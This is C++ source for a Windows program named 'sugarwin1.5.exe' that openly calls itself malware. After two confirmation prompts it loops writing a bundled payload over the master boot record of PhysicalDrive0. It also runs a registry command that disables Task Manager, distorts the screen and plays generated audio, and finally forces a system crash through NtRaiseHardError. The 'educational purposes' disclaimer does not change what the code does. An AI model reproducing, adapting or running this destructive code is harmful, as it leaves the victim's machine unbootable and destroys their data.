#include <Windows.h>
#include <windowsx.h>
#include <tchar.h>
#include <stdio.h>
#include <ctime>
#include <cmath>
#include <math.h>
#include <time.h>
#include <iostream>
#include <limits.h>
#include "MBR.h"
#pragma comment(lib, "winmm.lib")
#pragma comment(lib, "Msimg32.lib")
#define M_PI   3.14159265358979323846264338327950288
#define _USE_MATH_DEFINES 1
typedef NTSTATUS(NTAPI* NRHEdef)(NTSTATUS, ULONG, ULONG, PULONG, ULONG, PULONG);
typedef NTSTATUS(NTAPI* RAPdef)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
typedef union _RGBQUAD {
	COLORREF rgb;
	struct {
		BYTE r;
		BYTE g;
		BYTE b;
		BYTE Reserved;
	};
}_RGBQUAD, *PRGBQUAD;
int red, green, blue;
bool ifcolorblue = false, ifblue = false;
COLORREF Hue(int length) { //Credits to Void_/GetMBR
	if (red != length) {
		red < length; red++;
		if (ifblue == true) {
			return RGB(red, 0, length);
		}
		else {
			return RGB(red, 0, 0);
		}
	}
	else {
		if (green != length) {
			green < length; green++;
			return RGB(length, green, 0);
		}
		else {
			if (blue != length) {
				blue < length; blue++;
				return RGB(0, length, blue);
			}
			else {
				red = 0; green = 0; blue = 0;
				ifblue = true;
			}
		}
	}
}
DWORD WINAPI mbr(LPVOID lpParam) {
	while (1) {
		DWORD dwBytesWritten;
		HANDLE hDevice = CreateFileW(
			L"\\\\.\\PhysicalDrive0", GENERIC_ALL,
			FILE_SHARE_READ | FILE_SHARE_WRITE, 0,
			OPEN_EXISTING, 0, 0);

		WriteFile(hDevice, MasterBootRecord, 512, &dwBytesWritten, 0);
		CloseHandle(hDevice);
	}
}
DWORD WINAPI notaskmgr(LPVOID lpParam) {
	system("REG ADD hkcu\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\system /v DisableTaskMgr /t reg_dword /d 1 /f");
	return 1;
}
DWORD WINAPI balls(LPVOID lpParam) {
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	int signX = 1;
	int signY = 1;
	int signX1 = 1;
	int signY1 = 1;
	int incrementor = 10;
	int x = 10;
	int y = 10;
	while (1) {
		HDC hdc = GetDC(0);
		int top_x = 0 + x;
		int top_y = 0 + y;
		int bottom_x = 100 + x;
		int bottom_y = 100 + y;
		x += incrementor * signX;
		y += incrementor * signY;
		HBRUSH brush = CreateSolidBrush(Hue(239));
		SelectObject(hdc, brush);
		Ellipse(hdc, top_x, top_y, bottom_x, bottom_y);
		if (y >= GetSystemMetrics(SM_CYSCREEN))
		{
			signY = -1;
		}

		if (x >= GetSystemMetrics(SM_CXSCREEN))
		{
			signX = -1;
		}

		if (y == 0)
		{
			signY = 1;
		}

		if (x == 0)
		{
			signX = 1;
		}
		Sleep(10);
		DeleteObject(brush);
		ReleaseDC(0, hdc);
	}
}

DWORD WINAPI shader1(LPVOID lpParam) {
	HDC hdc = GetDC(0); HWND wnd = GetDesktopWindow();
	int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
	double angle = 0;
	while (1) {
		hdc = GetDC(0);
		for (float i = 0; i < sw + sh; i += 1.99f) {
			int a = sin(angle) * 700;
			BitBlt(hdc, 0, i, sw, 1, hdc, a, i, SRCCOPY);
			angle += M_PI / 3;
			DeleteObject(&i); DeleteObject(&a);
		}
		ReleaseDC(wnd, hdc);
		DeleteDC(hdc); DeleteObject(&sw); DeleteObject(&sh); DeleteObject(&angle);
	}
}

DWORD WINAPI payload6(LPVOID lpParam) {
	int sw, sh;

	while (1) {
		HDC hdc = GetDC(0);
		sw = GetSystemMetrics(0);
		sh = GetSystemMetrics(1);
		StretchBlt(hdc, -20, -20, sw + 40, sh + 40, hdc, 0, 0, sw, sh, SRCCOPY);
		ReleaseDC(0, hdc);
		Sleep(4);
	}
}

DWORD WINAPI bitblt1(LPVOID lpParam) {
	HDC desktop = GetDC(NULL);
	int xs = GetSystemMetrics(SM_CXSCREEN);
	int ys = GetSystemMetrics(SM_CYSCREEN);
	while (true) {
		desktop = GetDC(NULL);
		BitBlt(desktop, 3, 3, xs, ys, desktop, 5, 5, SRCCOPY);
		ReleaseDC(0, desktop);
		Sleep(10);
	}
}

DWORD WINAPI sustainepic(LPVOID lpParam) {
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);
	while (1) {
		HDC hdc = GetDC(0);
		HBRUSH brush = CreateSolidBrush(Hue(239));
		SelectObject(hdc, brush);
		//BitBlt(hdc, -30, 0, w, h, hdc, -30, 0, SRCCOPY);
		BitBlt(hdc, 5, 2, w, h, hdc, 6, 1, SRCCOPY);
		BitBlt(hdc, w - 5, 2, w, h, hdc, 6, 1, PATCOPY);
		//BitBlt(hdc, 0, 0, w, h, hdc, 0, -30, 0x1900ac010e);
		//BitBlt(hdc, 0, 0, w, h, hdc, 0, h - 30, 0x1900ac010e);
		DeleteObject(brush);
		ReleaseDC(0, hdc);
	}
}

DWORD WINAPI patblt(LPVOID lpParam)
{
	while (1) {
		HDC hdc = GetDC(NULL);
		int w = GetSystemMetrics(SM_CXSCREEN),
			h = GetSystemMetrics(SM_CYSCREEN);

		HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
		SelectObject(hdc, brush);
		PatBlt(hdc, 0, 0, w, h, PATINVERT);
		DeleteObject(brush);
		ReleaseDC(0, hdc);
	}
}

VOID WINAPI sound1() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t<<1^(t<<1)+(t>>7)&t>>12|t>>4-(1^7&t>>19)|t>>7);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound2() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t*((t/2>>10|t%16*t>>8)&8*t>>12&18)|-(t/16)+64);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound3() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(43*(4*t>>43|4*t>>4));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound4() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 22050, 22050, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[22050 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t>>6^t&t>>9^t>>12|(t<<(t>>6)%4^-t&-t>>13)%128^-t>>1);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound5() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t>>6^t&t>>9^t>>12|((t>>6|t<<1)+(t>>5|t<<3|t>>3)|t>>2|t<<1));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd) {
	if (MessageBoxW(NULL, L"The software you just executed is considerd malware and will distroy your devices masterboot record.", L"sugarwin1.5.exe", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
	{
		ExitProcess(0);
	}
	else
	{
		if (MessageBoxW(NULL, L"This was made for educational purposes only and should be tested in a isolated VM if executed. If you want to start the distruction press Yes to continue.", L"sugarwin1.5.exe", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
		{
			ExitProcess(0);
		}
		else
		CreateThread(0, 0, mbr, 0, 0, 0);
		CreateThread(0, 0, notaskmgr, 0, 0, 0);
		Sleep(1000);
		HANDLE thread1 = CreateThread(0, 0, shader1, 0, 0, 0);
		HANDLE thread2 = CreateThread(0, 0, balls, 0, 0, 0);
		sound1();
		Sleep(30000);
		Sleep(200);
		TerminateThread(thread1, 0);
		CloseHandle(thread1);
		TerminateThread(thread2, 0);
		CloseHandle(thread2);
		HANDLE thread3 = CreateThread(0, 0, bitblt1, 0, 0, 0);
		HANDLE thread4 = CreateThread(0, 0, balls, 0, 0, 0);
		sound2();
		Sleep(30000);
		Sleep(200);
		TerminateThread(thread3, 0);
		CloseHandle(thread3);
		TerminateThread(thread4, 0);
		CloseHandle(thread4);
		HANDLE thread5 = CreateThread(0, 0, payload6, 0, 0, 0);
		sound3();
		Sleep(30000);
		Sleep(200);
		TerminateThread(thread5, 0);
		CloseHandle(thread5);
		HANDLE thread6 = CreateThread(0, 0, sustainepic, 0, 0, 0);
		sound4();
		Sleep(30000);
		Sleep(200);
		TerminateThread(thread6, 0);
		CloseHandle(thread6);
		HANDLE thread7 = CreateThread(0, 0, balls, 0, 0, 0);
		HANDLE thread8 = CreateThread(0, 0, patblt, 0, 0, 0);
		sound5();
		Sleep(30000);
		Sleep(200);
		BOOLEAN bl;
		DWORD response;
		NRHEdef NtRaiseHardError = (NRHEdef)GetProcAddress(LoadLibraryW(L"ntdll"), "NtRaiseHardError");
		RAPdef RtlAdjustPrivilege = (RAPdef)GetProcAddress(LoadLibraryW(L"ntdll"), "RtlAdjustPrivilege");
		RtlAdjustPrivilege(19, 1, 0, &bl);
		NtRaiseHardError(0xC0000145, 0, 0, 0, 6, &response);
		Sleep(-1);
	}
}